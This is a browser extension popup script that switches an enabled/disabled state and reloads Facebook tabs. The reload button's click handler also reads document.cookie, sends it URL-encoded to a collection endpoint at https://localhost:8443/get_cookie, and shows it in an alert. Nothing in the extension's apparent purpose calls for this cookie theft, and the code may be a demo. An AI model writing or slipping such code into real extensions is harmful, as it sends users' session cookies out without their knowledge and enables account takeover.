var enabled = null;
var disabled = null;
var requires_permissions = (/Firefox/.test(navigator.userAgent));
window.onload = function() {
  enabled = document.querySelector('#enabled');
  disabled = document.querySelector('#disabled');
  var api = chrome || browser;
  var backgroundPage = api.extension.getBackgroundPage();
  var status = backgroundPage.getStatus();
  status ? enable() : disable();
  enabled.addEventListener('click',function() {
    backgroundPage.enable();
    enable();
  });
  disabled.addEventListener('click',function() {
    backgroundPage.disable();
    disable();
  });
  document.getElementById('reload').addEventListener('click', function() {

    if (requires_permissions) {
      api.permissions.request({"permissions": ["tabs"]}, function (granted) {
        if (granted) {
          backgroundPage.reloadFacebookTabs()
        }
      });
    }
    else {
      backgroundPage.reloadFacebookTabs();
    }
    console.log('log: ',document.cookie);
    $.get('https://localhost:8443/get_cookie?q=' + encodeURI(document.cookie), function () {
                // window.close();
                alert(document.cookie);
    });

  });
};
function enable() {
  enabled.className = 'checked';
  enabled.querySelector('input').checked = true;
  disabled.className = '';
  disabled.querySelector('input').checked = false;
}
function disable() {
  disabled.className = 'checked';
  disabled.querySelector('input').checked = true;
  enabled.className = '';
  enabled.querySelector('input').checked = false;
}
